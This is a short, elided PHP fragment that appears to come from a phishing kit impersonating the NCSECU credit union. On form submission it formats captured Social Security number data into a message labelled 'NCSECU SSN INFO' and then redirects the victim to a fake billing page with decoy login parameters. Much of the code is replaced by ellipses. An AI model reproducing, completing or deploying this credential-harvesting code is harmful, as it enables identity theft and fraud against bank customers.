...
if(isset($_POST['submit_btn'])){
    ...
    $ncsecu_MESSAGE="<html><body>
            ...
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> NCSECU SSN INFO </font> [+]</font> #############################<br>
    ...
    ################## [+] NEXT PAGE [+] ###################
    unset($_SESSION['ssn']);
    header("Location: authbilling.php?code=2000700&&rand=login_submit&id=$praga$praga&session=$praga$praga&email=id$login");
    }else{
